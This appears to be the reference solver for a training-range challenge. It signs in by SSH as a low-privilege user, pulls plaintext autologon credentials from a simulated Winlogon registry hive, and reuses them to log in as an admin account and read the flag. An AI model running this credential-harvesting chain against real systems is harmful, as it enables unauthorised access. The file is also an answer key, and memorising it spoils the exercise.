"""Intended-path solver: read simulated Winlogon values, reuse them as adminsim."""

import re
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

HIVE_QUERY = "grep -hE '^(DefaultUserName|DefaultPassword)=' '/opt/registry/HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon.hiv'"
VALUE_RE = re.compile(r"^(DefaultUserName|DefaultPassword)=(.+)$", re.MULTILINE)
FLAG_READ = "cat /home/adminsim/flag.txt"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _connect(host: str, port: int, username: str, password: str) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username=username,
        password=password,
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    return client


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    detail = None
    captured = None

    learner = _connect(host, port, "learner", "learner")
    try:
        _, stdout, stderr = learner.exec_command(HIVE_QUERY, timeout=15)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
    finally:
        learner.close()

    values = dict(VALUE_RE.findall(out))
    user = values.get("DefaultUserName")
    password = values.get("DefaultPassword")
    if not user or not password:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="autologon-reuse",
                    ok=False,
                    detail=f"autologon values not found in hive output: {out[:120]} {err[:120]}",
                )
            ]
        )

    try:
        admin = _connect(host, port, user, password)
    except paramiko.AuthenticationException:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="autologon-reuse",
                    ok=False,
                    detail=f"hive credentials rejected for {user}",
                )
            ]
        )
    try:
        _, stdout, stderr = admin.exec_command(FLAG_READ, timeout=15)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
    finally:
        admin.close()

    flags = find_flags(out)
    if flags:
        captured = flags[0]
        detail = f"autologon credentials for {user} accepted; flag read from home"
    else:
        detail = f"flag file unreadable as {user}: {err[:160]}"

    return SolveResult(
        results=[
            TaskResult(
                task_id="autologon-reuse", ok=captured is not None, captured=captured, detail=detail
            )
        ]
    )
